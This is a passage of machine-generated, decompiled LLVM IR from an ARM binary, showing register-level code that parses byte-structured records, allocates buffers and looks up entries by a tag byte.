  %v1_a098 = phi i32 [ %v1_a098.pre, %.dec_label_pc_a090_crit_edge ], [ %v1_a0a0, %dec_label_pc_a0dc ], [ %v1_a0a0, %dec_label_pc_a0d0 ], [ %v1_a0a0, %dec_label_pc_a0c0 ], [ %v1_a0a0, %dec_label_pc_a09c ], [ %v0_a088, %dec_label_pc_a078 ], [ %v0_a28c, %dec_label_pc_a288 ]
  store i32 %v6_a078, i32* @r5, align 4
  store i32 %v9_a078, i32* @r6, align 4
  store i32 %v12_a078, i32* @r7, align 4
  store i32 %v18_a078, i32* @sb, align 4
  store i32 %v21_a078, i32* @sl, align 4
  store i32 %v24_a078, i32* @fp, align 4
  ret i32 %v1_a098

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a078
  %v1_a09c = inttoptr i32 %v0_a088 to i32*
  %v2_a09c = load i32, i32* %v1_a09c, align 4
  store i32 %v2_a09c, i32* %r1.global-to-local, align 4
  %v1_a0a0 = and i32 %v2_a09c, 16711680
  store i32 %v1_a0a0, i32* %r0.global-to-local, align 4
  %v3_a0a4 = udiv i32 %v2_a09c, 16777216
  %v4_a0a8 = udiv i32 %v1_a0a0, 256
  %v5_a0a8 = or i32 %v4_a0a8, %v3_a0a4
  %v1_a0ac = and i32 %v2_a09c, 65280
  store i32 %v1_a0ac, i32* %r2.global-to-local, align 4
  %v4_a0b0 = mul nuw nsw i32 %v1_a0ac, 256
  %v5_a0b0 = or i32 %v5_a0a8, %v4_a0b0
  store i32 %v5_a0b0, i32* %r3.global-to-local, align 4
  %v7_a0b4 = icmp eq i32 %arg2, 4
  store i1 %v7_a0b4, i1* %cpsr_z.global-to-local, align 1
  %v5_a0b8 = call i32 @llvm.bswap.i32(i32 %v2_a09c)
  store i32 %v5_a0b8, i32* @fp, align 4
  br i1 %v7_a0b4, label %dec_label_pc_a090, label %dec_label_pc_a0c0

dec_label_pc_a0c0:                                ; preds = %dec_label_pc_a09c
  %v1_a0c0 = add i32 %v0_a088, 4
  %v2_a0c0 = inttoptr i32 %v1_a0c0 to i8*
  %v3_a0c0 = load i8, i8* %v2_a0c0, align 1
  %v4_a0c0 = zext i8 %v3_a0c0 to i32
  store i32 %v4_a0c0, i32* %r2.global-to-local, align 4
  %v7_a0c4 = icmp eq i32 %arg2, 5
  store i1 %v7_a0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0c4, label %dec_label_pc_a090, label %dec_label_pc_a0d0

dec_label_pc_a0d0:                                ; preds = %dec_label_pc_a0c0
  %v1_a0d0 = add i32 %v0_a088, 5
  %v2_a0d0 = inttoptr i32 %v1_a0d0 to i8*
  %v3_a0d0 = load i8, i8* %v2_a0d0, align 1
  %v4_a0d0 = zext i8 %v3_a0d0 to i32
  store i32 %v4_a0d0, i32* @sb, align 4
  %v2_a0d4 = icmp eq i8 %v3_a0d0, 0
  store i1 %v2_a0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a0d4, label %dec_label_pc_a090, label %dec_label_pc_a0dc

dec_label_pc_a0dc:                                ; preds = %dec_label_pc_a0d0
  %v2_a0e0 = mul nuw nsw i32 %v4_a0d0, 5
  store i32 %v2_a0e0, i32* @r7, align 4
  %v1_a0e4 = add i32 %arg2, -6
  store i32 %v1_a0e4, i32* %r3.global-to-local, align 4
  %v3_a0e8 = icmp ult i32 %v1_a0e4, %v2_a0e0
  %v9_a0e8 = icmp eq i32 %v1_a0e4, %v2_a0e0
  store i1 %v9_a0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a0e8, label %dec_label_pc_a090, label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_a0dc
  store i32 %v4_a0d0, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a0e4, i32* @r6, align 4
  %v2_a0fc = call i32 @function_11958(i32 %v4_a0d0, i32 24)
  store i32 %v2_a0fc, i32* @ip, align 4
  %v0_a108 = load i32, i32* @r7, align 4
  %v1_a108 = load i32, i32* @r4, align 4
  %v2_a108 = sub i32 %v1_a108, %v0_a108
  store i32 %v2_a108, i32* @r7, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  %v1_a10c = add i32 %v0_a10c, 11
  store i32 %v1_a10c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a110

dec_label_pc_a110:                                ; preds = %dec_label_pc_a110, %dec_label_pc_a0f0
  %v1_a114 = phi i32 [ %v1_a140, %dec_label_pc_a110 ], [ %v2_a0fc, %dec_label_pc_a0f0 ]
  %v0_a110 = phi i32 [ %v1_a13c, %dec_label_pc_a110 ], [ %v1_a10c, %dec_label_pc_a0f0 ]
  %v1_a110 = add i32 %v0_a110, -5
  %v2_a110 = inttoptr i32 %v1_a110 to i32*
  %v3_a110 = load i32, i32* %v2_a110, align 4
  store i32 %v3_a110, i32* %r1.global-to-local, align 4
  %v2_a114 = add i32 %v1_a114, 16
  %v3_a114 = inttoptr i32 %v2_a114 to i32*
  store i32 %v3_a110, i32* %v3_a114, align 4
  %v0_a118 = load i32, i32* @r7, align 4
  %v1_a118 = add i32 %v0_a118, -6
  store i32 %v1_a118, i32* %r3.global-to-local, align 4
  %v0_a11c = load i32, i32* %r0.global-to-local, align 4
  %v1_a11c = add i32 %v0_a11c, -1
  %v2_a11c = inttoptr i32 %v1_a11c to i8*
  %v3_a11c = load i8, i8* %v2_a11c, align 1
  %v4_a11c = zext i8 %v3_a11c to i32
  store i32 %v4_a11c, i32* %r2.global-to-local, align 4
  %v0_a120 = load i32, i32* @r6, align 4
  %v1_a120 = add i32 %v0_a120, -5
  store i32 %v1_a120, i32* @r6, align 4
  %v9_a124 = icmp eq i32 %v1_a120, %v1_a118
  store i1 %v9_a124, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_a11c, i32* @r4, align 4
  %v2_a130 = load i32, i32* @ip, align 4
  %v3_a130 = add i32 %v2_a130, 20
  %v4_a130 = inttoptr i32 %v3_a130 to i8*
  store i8 %v3_a11c, i8* %v4_a130, align 1
  %v0_a134 = load i32, i32* %r1.global-to-local, align 4
  %v1_a134 = load i32, i32* @ip, align 4
  %v2_a134 = add i32 %v1_a134, 4
  %v3_a134 = inttoptr i32 %v2_a134 to i32*
  store i32 %v0_a134, i32* %v3_a134, align 4
  %v0_a138 = load i32, i32* %r3.global-to-local, align 4
  %v1_a138 = trunc i32 %v0_a138 to i16
  %v2_a138 = load i32, i32* @ip, align 4
  %v3_a138 = inttoptr i32 %v2_a138 to i16*
  store i16 %v1_a138, i16* %v3_a138, align 2
  %v0_a13c = load i32, i32* %r0.global-to-local, align 4
  %v1_a13c = add i32 %v0_a13c, 5
  store i32 %v1_a13c, i32* %r0.global-to-local, align 4
  %v0_a140 = load i32, i32* @ip, align 4
  %v1_a140 = add i32 %v0_a140, 24
  store i32 %v1_a140, i32* @ip, align 4
  %v0_a144 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a144, label %dec_label_pc_a148, label %dec_label_pc_a110

dec_label_pc_a148:                                ; preds = %dec_label_pc_a110
  %v0_a148 = load i32, i32* @r6, align 4
  %v2_a148 = icmp eq i32 %v0_a148, 0
  store i1 %v2_a148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a148, label %dec_label_pc_a24c, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a148
  %v0_a150 = load i32, i32* @r4, align 4
  %v1_a150 = inttoptr i32 %v0_a150 to i8*
  %v2_a150 = load i8, i8* %v1_a150, align 1
  %v3_a150 = zext i8 %v2_a150 to i32
  store i32 %v3_a150, i32* @r5, align 4
  %v2_a154 = icmp eq i8 %v2_a150, 0
  store i1 %v2_a154, i1* %cpsr_z.global-to-local, align 1
  %v0_a158 = load i32, i32* @r7, align 4
  %v1_a158 = add i32 %v0_a158, -7
  store i32 %v1_a158, i32* @r8, align 4
  br i1 %v2_a154, label %bb, label %dec_label_pc_a164

bb:                                               ; preds = %dec_label_pc_a150
  store i32 %v3_a150, i32* @r6, align 4
  br label %dec_label_pc_a228

dec_label_pc_a164:                                ; preds = %dec_label_pc_a150
  store i32 %v3_a150, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a16c = call i32 @function_11958(i32 %v3_a150, i32 8)
  store i32 %v2_a16c, i32* %r0.global-to-local, align 4
  %v0_a170 = load i32, i32* @r8, align 4
  %v2_a170 = icmp eq i32 %v0_a170, 0
  store i1 %v2_a170, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a16c, i32* @r6, align 4
  br i1 %v2_a170, label %dec_label_pc_a24c, label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %dec_label_pc_a164
  %v0_a17c = load i32, i32* @r4, align 4
  %v1_a17c = add i32 %v0_a17c, 1
  %v2_a17c = inttoptr i32 %v1_a17c to i8*
  %v3_a17c = load i8, i8* %v2_a17c, align 1
  %v0_a180 = load i32, i32* @r7, align 4
  %v7_a180 = icmp eq i32 %v0_a180, 8
  store i1 %v7_a180, i1* %cpsr_z.global-to-local, align 1
  %v3_a184 = add i32 %v2_a16c, 4
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v3_a17c, i8* %v4_a184, align 1
  %v0_a188 = load i32, i32* @r4, align 4
  %v1_a188 = add i32 %v0_a188, 1
  store i32 %v1_a188, i32* %r3.global-to-local, align 4
  %v0_a18c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a18c, label %dec_label_pc_a24c, label %dec_label_pc_a190

dec_label_pc_a190:                                ; preds = %dec_label_pc_a17c
  %v1_a190 = add i32 %v0_a188, 2
  %v2_a190 = inttoptr i32 %v1_a190 to i8*
  %v3_a190 = load i8, i8* %v2_a190, align 1
  %v4_a190 = zext i8 %v3_a190 to i32
  store i32 %v4_a190, i32* @r4, align 4
  %v0_a194 = load i32, i32* @r7, align 4
  %v1_a194 = add i32 %v0_a194, -9
  store i32 %v1_a194, i32* @r8, align 4
  %v9_a198 = icmp eq i32 %v1_a194, %v4_a190
  store i1 %v9_a198, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a190, i32* %r1.global-to-local, align 4
  %v5_a1a0 = icmp slt i32 %v1_a194, %v4_a190
  br i1 %v5_a1a0, label %dec_label_pc_a24c, label %bb35

bb35:                                             ; preds = %dec_label_pc_a190
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_a1a47 = add i32 %v0_a188, 3
  store i32 %v7_a1a47, i32* @r7, align 4
  %v6_a1a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a1a8, i32* @sl, align 4
  br label %dec_label_pc_a1ec

dec_label_pc_a1b8:                                ; preds = %dec_label_pc_a1ec
  %v0_a1b8 = load i32, i32* @r8, align 4
  %v1_a1b8 = load i32, i32* @r4, align 4
  %v2_a1b8 = sub i32 %v0_a1b8, %v1_a1b8
  store i32 %v2_a1b8, i32* %r2.global-to-local, align 4
  %v9_a1b8 = icmp eq i32 %v0_a1b8, %v1_a1b8
  store i1 %v9_a1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a1b8, label %dec_label_pc_a24c, label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %dec_label_pc_a1b8
  %v1_a1c0 = load i32, i32* @r7, align 4
  %v2_a1c0 = add i32 %v1_a1c0, %v1_a1b8
  %v3_a1c0 = inttoptr i32 %v2_a1c0 to i8*
  %v4_a1c0 = load i8, i8* %v3_a1c0, align 1
  store i32 %v2_a1c0, i32* %r0.global-to-local, align 4
  %v1_a1c8 = add i32 %v2_a1b8, -1
  store i32 %v1_a1c8, i32* %r2.global-to-local, align 4
  %v7_a1c8 = icmp eq i32 %v2_a1b8, 1
  store i1 %v7_a1c8, i1* %cpsr_z.global-to-local, align 1
  %v3_a1cc = add i32 %v2_a220, 4
  %v4_a1cc = inttoptr i32 %v3_a1cc to i8*
  store i8 %v4_a1c0, i8* %v4_a1cc, align 1
  %v0_a1d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1d0 = add i32 %v0_a1d0, 1
  store i32 %v1_a1d0, i32* %r3.global-to-local, align 4
  %v0_a1d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1d4 = add i32 %v0_a1d4, -1
  store i32 %v1_a1d4, i32* @r8, align 4
  %v1_a1d8 = add i32 %v0_a1d0, 2
  store i32 %v1_a1d8, i32* @r7, align 4
  %v0_a1dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1dc, label %dec_label_pc_a24c, label %dec_label_pc_a1e0

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a1c0
  %v2_a1e0 = inttoptr i32 %v1_a1d0 to i8*
  %v3_a1e0 = load i8, i8* %v2_a1e0, align 1
  %v4_a1e0 = zext i8 %v3_a1e0 to i32
  store i32 %v4_a1e0, i32* @r4, align 4
  %v2_a1e4 = sub i32 %v1_a1d4, %v4_a1e0
  %tmp36 = sub i32 0, %v2_a1e4
  %v6_a1e4 = and i32 %v1_a1d4, %tmp36
  %v7_a1e4 = icmp slt i32 %v6_a1e4, 0
  %v8_a1e4 = icmp slt i32 %v2_a1e4, 0
  %v9_a1e4 = icmp eq i32 %v1_a1d4, %v4_a1e0
  store i1 %v9_a1e4, i1* %cpsr_z.global-to-local, align 1
  %v2_a1e8 = xor i1 %v8_a1e4, %v7_a1e4
  br i1 %v2_a1e8, label %dec_label_pc_a24c, label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %bb35, %dec_label_pc_a1e0
  %v0_a1f0 = phi i32 [ %v4_a190, %bb35 ], [ %v4_a1e0, %dec_label_pc_a1e0 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_a200, %dec_label_pc_a1e0 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a1f0 = add nuw nsw i32 %v0_a1f0, 1
  store i32 %v1_a1f0, i32* %r0.global-to-local, align 4
  %v2_a1f4 = call i32 @function_11958(i32 %v1_a1f0, i32 1)
  store i32 %v2_a1f4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_a1fc = load i32, i32* @sl, align 4
  %v2_a1fc = inttoptr i32 %v1_a1fc to i32*
  store i32 %v2_a1f4, i32* %v2_a1fc, align 4
  %v0_a200 = load i32, i32* %r3.global-to-local, align 4
  %v1_a200 = add i32 %v0_a200, 1
  store i32 %v1_a200, i32* %r3.global-to-local, align 4
  %v0_a204 = load i32, i32* @r4, align 4
  store i32 %v0_a204, i32* %r2.global-to-local, align 4
  %v0_a208 = load i32, i32* @r7, align 4
  store i32 %v0_a208, i32* %r1.global-to-local, align 4
  %v3_a210 = call i32 @function_f9ac(i32 %v2_a1f4, i32 %v0_a208, i32 %v0_a204)
  store i32 %v3_a210, i32* %r0.global-to-local, align 4
  store i32 %v1_a200, i32* %r2.global-to-local, align 4
  %v3_a218 = mul i32 %v1_a200, 8
  store i32 %v3_a218, i32* %r3.global-to-local, align 4
  %v1_a21c = load i32, i32* @r5, align 4
  %v9_a21c = icmp eq i32 %v1_a200, %v1_a21c
  store i1 %v9_a21c, i1* %cpsr_z.global-to-local, align 1
  %v0_a220 = load i32, i32* @r6, align 4
  %v2_a220 = add i32 %v0_a220, %v3_a218
  store i32 %v2_a220, i32* @sl, align 4
  br i1 %v9_a21c, label %dec_label_pc_a228, label %dec_label_pc_a1b8

dec_label_pc_a228:                                ; preds = %dec_label_pc_a1ec, %bb
  %v0_a228 = call i32 @function_10a30()
  %v2_a230 = inttoptr i32 %v0_a228 to i32*
  store i32 0, i32* %v2_a230, align 4
  store i32 %v4_a0c0, i32* %r1.global-to-local, align 4
  %v0_a238 = load i32, i32* @fp, align 4
  store i32 %v0_a238, i32* %r0.global-to-local, align 4
  %v0_a23c = load i32, i32* @sb, align 4
  store i32 %v0_a23c, i32* %r2.global-to-local, align 4
  store i32 %v2_a0fc, i32* %r3.global-to-local, align 4
  %v2_a244 = load i32, i32* @r5, align 4
  %v5_a244 = load i32, i32* @r6, align 4
  %v6_a248 = trunc i32 %v2_a244 to i8
  %v7_a248 = call i32 @function_9f7c(i32 %v0_a238, i32 %v4_a0c0, i32 %v0_a23c, i32 %v2_a0fc, i8 %v6_a248, i32 %v5_a244)
  store i32 %v7_a248, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a24c

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a1e0, %dec_label_pc_a1c0, %dec_label_pc_a1b8, %dec_label_pc_a190, %dec_label_pc_a17c, %dec_label_pc_a164, %dec_label_pc_a148, %dec_label_pc_a228
  store i32 %v2_a0fc, i32* %r3.global-to-local, align 4
  %v2_a250 = icmp eq i32 %v2_a0fc, 0
  store i1 %v2_a250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a250, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_a24c
  store i32 %v2_a0fc, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_a24c, %bb37
  store i32 41564, i32* @lr, align 4
  %v1_a258 = xor i1 %v2_a250, true
  call void @__pseudo_cond_branch(i1 %v1_a258, i32 ptrtoint (i32* @global_var_120a4.55 to i32))
  %v0_a25c = load i32, i32* @r6, align 4
  %v2_a25c = icmp eq i32 %v0_a25c, 0
  store i1 %v2_a25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a25c, label %.dec_label_pc_a090_crit_edge, label %dec_label_pc_a264

.dec_label_pc_a090_crit_edge:                     ; preds = %bb38
  %v1_a098.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a090

dec_label_pc_a264:                                ; preds = %bb38
  %v0_a264 = load i32, i32* @r5, align 4
  %v2_a264 = icmp eq i32 %v0_a264, 0
  store i1 %v2_a264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a264, label %dec_label_pc_a288, label %dec_label_pc_a26c

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a264
  br label %dec_label_pc_a270

dec_label_pc_a270:                                ; preds = %dec_label_pc_a270, %dec_label_pc_a26c
  %v0_a278 = phi i32 [ 0, %dec_label_pc_a26c ], [ %v1_a280, %dec_label_pc_a270 ]
  %v0_a270 = phi i32 [ %v0_a25c, %dec_label_pc_a26c ], [ %v0_a288.pre, %dec_label_pc_a270 ]
  %v4_a270 = mul i32 %v0_a278, 8
  %v5_a270 = add i32 %v4_a270, %v0_a270
  %v6_a270 = inttoptr i32 %v5_a270 to i32*
  %v7_a270 = load i32, i32* %v6_a270, align 4
  store i32 %v7_a270, i32* %r0.global-to-local, align 4
  %v2_a274 = icmp eq i32 %v7_a270, 0
  store i1 %v2_a274, i1* %cpsr_z.global-to-local, align 1
  %v1_a278 = add i32 %v0_a278, 1
  store i32 %v1_a278, i32* @r4, align 4
  store i32 41600, i32* @lr, align 4
  %v1_a27c = xor i1 %v2_a274, true
  call void @__pseudo_cond_branch(i1 %v1_a27c, i32 ptrtoint (i32* @global_var_120a4.55 to i32))
  %v0_a280 = load i32, i32* @r5, align 4
  %v1_a280 = load i32, i32* @r4, align 4
  %v9_a280 = icmp eq i32 %v0_a280, %v1_a280
  store i1 %v9_a280, i1* %cpsr_z.global-to-local, align 1
  %v0_a288.pre = load i32, i32* @r6, align 4
  br i1 %v9_a280, label %dec_label_pc_a288, label %dec_label_pc_a270

dec_label_pc_a288:                                ; preds = %dec_label_pc_a270, %dec_label_pc_a264
  %v0_a288 = phi i32 [ %v0_a25c, %dec_label_pc_a264 ], [ %v0_a288.pre, %dec_label_pc_a270 ]
  store i32 %v0_a288, i32* @r0, align 4
  %v0_a28c = call i32 @function_120a4()
  store i32 %v0_a28c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a090

; uselistorder directives
  uselistorder i32 %v0_a28c, { 1, 0 }
  uselistorder i32 %v1_a280, { 1, 0 }
  uselistorder i1 %v2_a250, { 0, 2, 1 }
  uselistorder i32 %v2_a220, { 1, 0 }
  uselistorder i32 %v3_a218, { 1, 0 }
  uselistorder i32 %v1_a200, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_a1e4, { 1, 0 }
  uselistorder i32 %v4_a1e0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a1d4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a150, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a140, { 1, 0 }
  uselistorder i32 %v1_a13c, { 1, 0 }
  uselistorder i32 %v2_a0fc, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_a0d0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a0a0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_a09c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_a088, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 20, 3, 21, 5, 8, 10, 9, 6, 7, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_a24c, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_a090, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_a294(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a294:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_a294 = icmp eq i32 %arg1, 0
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a294, label %dec_label_pc_a2dc, label %dec_label_pc_a2a4

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a294
  %v0_a2a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a2a4 = add i32 %v0_a2a4, 4
  %v2_a2a4 = inttoptr i32 %v1_a2a4 to i8*
  %v3_a2a4 = load i8, i8* %v2_a2a4, align 1
  %v4_a2a4 = zext i8 %v3_a2a4 to i32
  %v9_a2a8 = icmp eq i32 %v4_a2a4, %arg3
  br i1 %v9_a2a8, label %dec_label_pc_a2e8, label %dec_label_pc_a2cc.preheader

dec_label_pc_a2cc.preheader:                      ; preds = %dec_label_pc_a2a4
  br label %dec_label_pc_a2cc

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a2cc
  %v1_a2bc = add i32 %v0_a2c4.in, 12
  %v2_a2bc = inttoptr i32 %v1_a2bc to i8*
  %v3_a2bc = load i8, i8* %v2_a2bc, align 1
  %v4_a2bc = zext i8 %v3_a2bc to i32
  %v9_a2c0 = icmp eq i32 %v4_a2bc, %arg3
  br i1 %v9_a2c0, label %dec_label_pc_a2e8, label %dec_label_pc_a2cc

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a2cc.preheader, %dec_label_pc_a2bc
  %v0_a2c4.in = phi i32 [ %v0_a2a4, %dec_label_pc_a2cc.preheader ], [ %v0_a2c4, %dec_label_pc_a2bc ]
  %v0_a2cc = phi i32 [ 0, %dec_label_pc_a2cc.preheader ], [ %v1_a2cc, %dec_label_pc_a2bc ]
  %v0_a2c4 = add i32 %v0_a2c4.in, 8
  %v1_a2cc = add i32 %v0_a2cc, 1
  %v9_a2d0 = icmp eq i32 %v1_a2cc, %arg1
  store i32 %v0_a2c4, i32* %r1.global-to-local, align 4
  br i1 %v9_a2d0, label %dec_label_pc_a2dc, label %dec_label_pc_a2bc

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_a2cc, %dec_label_pc_a2e8, %dec_label_pc_a294, %dec_label_pc_a2f4
  %v0_a2dc = phi i32 [ %arg4, %dec_label_pc_a2e8 ], [ %arg4, %dec_label_pc_a294 ], [ %v1_a2f4, %dec_label_pc_a2f4 ], [ %arg4, %dec_label_pc_a2cc ]
  ret i32 %v0_a2dc

dec_label_pc_a2e8:                                ; preds = %dec_label_pc_a2bc, %dec_label_pc_a2a4
  %v0_a2e8 = phi i32 [ %v0_a2a4, %dec_label_pc_a2a4 ], [ %v0_a2c4, %dec_label_pc_a2bc ]
  %v1_a2e8 = inttoptr i32 %v0_a2e8 to i32*
  %v2_a2e8 = load i32, i32* %v1_a2e8, align 4
  store i32 %v2_a2e8, i32* @r0, align 4
  %v2_a2ec = icmp eq i32 %v2_a2e8, 0
  br i1 %v2_a2ec, label %dec_label_pc_a2dc, label %dec_label_pc_a2f4

dec_label_pc_a2f4:                                ; preds = %dec_label_pc_a2e8
  %v1_a2f4 = call i32 @function_10b40(i32 %v2_a2e8)
  br label %dec_label_pc_a2dc

; uselistorder directives
  uselistorder i32 %v1_a2cc, { 1, 0 }
  uselistorder i32 %v0_a2c4, { 1, 0, 2 }
  uselistorder i32 %v0_a2c4.in, { 1, 0 }
  uselistorder i32 %v0_a2a4, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a2dc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a2cc, { 1, 0 }
}

define i32 @function_a300(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a300:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a300 = icmp eq i32 %arg1, 0
  %v3_a304 = load i32, i32* @r4, align 4
  store i32 %v3_a304, i32* %stack_var_-8, align 4
  %v6_a304 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a300, label %dec_label_pc_a348, label %dec_label_pc_a310

dec_label_pc_a310:                                ; preds = %dec_label_pc_a300
  %v0_a310 = load i32, i32* %r1.global-to-local, align 4
  %v1_a310 = add i32 %v0_a310, 4
  %v2_a310 = inttoptr i32 %v1_a310 to i8*
  %v3_a310 = load i8, i8* %v2_a310, align 1
  %v4_a310 = zext i8 %v3_a310 to i32
  %v9_a314 = icmp eq i32 %v4_a310, %arg3
  br i1 %v9_a314, label %dec_label_pc_a354, label %dec_label_pc_a338.preheader

dec_label_pc_a338.preheader:                      ; preds = %dec_label_pc_a310
  br label %dec_label_pc_a338

dec_label_pc_a328:                                ; preds = %dec_label_pc_a338
  %v1_a328 = add i32 %v0_a330.in, 12
  %v2_a328 = inttoptr i32 %v1_a328 to i8*
  %v3_a328 = load i8, i8* %v2_a328, align 1
  %v4_a328 = zext i8 %v3_a328 to i32
  %v9_a32c = icmp eq i32 %v4_a328, %arg3
  br i1 %v9_a32c, label %dec_label_pc_a354, label %dec_label_pc_a338

dec_label_pc_a338:                                ; preds = %dec_label_pc_a338.preheader, %dec_label_pc_a328
  %v0_a330.in = phi i32 [ %v0_a310, %dec_label_pc_a338.preheader ], [ %v0_a330, %dec_label_pc_a328 ]
  %v0_a338 = phi i32 [ 0, %dec_label_pc_a338.preheader ], [ %v1_a338, %dec_label_pc_a328 ]
  %v0_a330 = add i32 %v0_a330.in, 8
  %v1_a338 = add i32 %v0_a338, 1
  store i32 %v1_a338, i32* @lr, align 4
  %v9_a33c = icmp eq i32 %v1_a338, %arg1
  store i32 %v0_a330, i32* %r1.global-to-local, align 4
  br i1 %v9_a33c, label %dec_label_pc_a348, label %dec_label_pc_a328

dec_label_pc_a348:                                ; preds = %dec_label_pc_a338, %dec_label_pc_a354, %dec_label_pc_a300, %dec_label_pc_a360
  %v2_a34c = phi i32 [ %v3_a304, %dec_label_pc_a354 ], [ %v3_a304, %dec_label_pc_a300 ], [ %v2_a34c.pre, %dec_label_pc_a360 ], [ %v3_a304, %dec_label_pc_a338 ]
  %v0_a348 = phi i32 [ %arg4, %dec_label_pc_a354 ], [ %arg4, %dec_label_pc_a300 ], [ %v3_a364, %dec_label_pc_a360 ], [ %arg4, %dec_label_pc_a338 ]
  store i32 %v2_a34c, i32* @r4, align 4
  store i32 %v6_a304, i32* @lr, align 4
  ret i32 %v0_a348

dec_label_pc_a354:                                ; preds = %dec_label_pc_a328, %dec_label_pc_a310
  %v0_a354 = phi i32 [ %v0_a310, %dec_label_pc_a310 ], [ %v0_a330, %dec_label_pc_a328 ]
  %v1_a354 = inttoptr i32 %v0_a354 to i32*
  %v2_a354 = load i32, i32* %v1_a354, align 4
  %v2_a358 = icmp eq i32 %v2_a354, 0
  br i1 %v2_a358, label %dec_label_pc_a348, label %dec_label_pc_a360

dec_label_pc_a360:                                ; preds = %dec_label_pc_a354
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a364 = inttoptr i32 %v2_a354 to i8*
  %v3_a364 = call i32 @function_fa60(i8* %v2_a364, i32 10)
  %v2_a34c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a348

; uselistorder directives
  uselistorder i32 %v1_a338, { 1, 2, 0 }
  uselistorder i32 %v0_a330, { 1, 0, 2 }
  uselistorder i32 %v0_a330.in, { 1, 0 }
  uselistorder i32 %v0_a310, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
